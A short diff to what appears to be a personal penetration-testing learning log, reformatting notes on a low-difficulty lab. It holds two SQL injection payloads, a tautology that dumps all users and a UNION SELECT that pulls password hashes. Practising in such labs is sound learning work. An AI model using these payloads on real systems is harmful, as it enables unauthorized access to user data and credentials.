@@ -7,8 +7,11 @@ My penetration testing learning journey
 - Difficulty: Low
 
 ### Step 1 - Extracted all users
-Payload: 1' OR '1'='1' #
-Result: database returned all 5 users
+**Payload:**
+\```
+1' OR '1'='1' #
+\```
+**Result:** database returned all 5 users
 
 ### Step 2 - Extracted password hashes
 Payload: 1' UNION SELECT user, password FROM users #
